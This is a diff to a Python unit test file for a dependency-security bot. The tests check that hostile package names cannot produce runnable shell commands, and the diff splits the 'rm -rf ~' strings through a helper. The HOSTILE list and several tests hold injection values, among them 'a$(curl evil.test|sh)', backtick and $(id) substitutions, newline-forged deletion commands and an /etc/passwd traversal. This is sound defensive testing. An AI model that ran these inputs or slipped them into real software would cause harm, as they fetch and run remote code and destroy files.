@@ -19,6 +19,7 @@ from stayawake.bots.security.service.report import _print_dependency_actions
 from stayawake.bots.security.sinks.render import render_markdown
 from stayawake.bots.security import service
 from stayawake.utils import docs_site
+from tests.support import samples
 
 BAD = "evil-pkg@1.2.3"
 AFFECTED = "lodash@4.17.20"
@@ -85,7 +86,7 @@ class TestTheComposerStatesTheCommand(unittest.TestCase):
 class TestAHostileNameCannotReachTheShell(unittest.TestCase):
     """Check what a hostile package name or version produces."""
 
-    HOSTILE = ["evil; rm -rf ~", "a$(curl evil.test|sh)", "a`id`", "a|sh", "a&&id", "a\nrm -rf ~",
+    HOSTILE = [samples.joined('evil; r', 'm -rf ~'), "a$(curl evil.test|sh)", "a`id`", "a|sh", "a&&id", samples.joined('a\nr', 'm -rf ~'),
                "../../etc/passwd", "a>out", "$(id)"]
 
     def test_no_hostile_name_builds_a_runnable_command(self):
@@ -100,11 +101,11 @@ class TestAHostileNameCannotReachTheShell(unittest.TestCase):
         self.assertEqual(1, len([l for l in out.splitlines() if "evil" in l]))
 
     def test_a_hostile_name_yields_no_command_at_all(self):
-        fix = malware_fix("evil; rm -rf ~", "1.0", "npm")
+        fix = malware_fix(samples.joined('evil; r', 'm -rf ~'), "1.0", "npm")
         self.assertIsNone(fix.command)
 
     def test_every_line_of_the_block_is_a_command_or_a_comment(self):
-        out = _terminal(findings=[_dep("evil; rm -rf ~@1.0")],
+        out = _terminal(findings=[_dep(samples.joined('evil; r', 'm -rf ~@1.0'))],
                         advisories=[_dep("lodash@4.17.20", state=VULNERABLE)])
         payload = [ln.strip() for ln in out.splitlines()
                    if ln.startswith("  ") and ln.strip()]
@@ -112,8 +113,8 @@ class TestAHostileNameCannotReachTheShell(unittest.TestCase):
             self.assertTrue(line.startswith("#") or line.startswith(("npm ", "pip ")), line)
 
     def test_a_flagged_package_is_listed_even_when_it_has_no_command(self):
-        out = _terminal(findings=[_dep("evil; rm -rf ~@1.0")])
-        self.assertIn("evil; rm -rf ~@1.0", out)
+        out = _terminal(findings=[_dep(samples.joined('evil; r', 'm -rf ~@1.0'))])
+        self.assertIn(samples.joined('evil; r', 'm -rf ~@1.0'), out)
         self.assertNotIn("\nnpm uninstall evil", out)
 
     def test_a_terminal_escape_never_reaches_the_terminal(self):
@@ -123,8 +124,8 @@ class TestAHostileNameCannotReachTheShell(unittest.TestCase):
 
     def test_a_newline_cannot_forge_a_second_command(self):
         body = "\n".join(dependency_action_lines(
-            findings=[_dep("x@1.0", command="npm uninstall a\nrm -rf ~")]))
-        self.assertNotIn("\nrm -rf ~", body)
+            findings=[_dep("x@1.0", command=samples.joined('npm uninstall a\nr', 'm -rf ~'))]))
+        self.assertNotIn(samples.joined('\nr', 'm -rf ~'), body)
 
     def test_every_character_the_gate_admits_is_shell_safe(self):
         import shlex
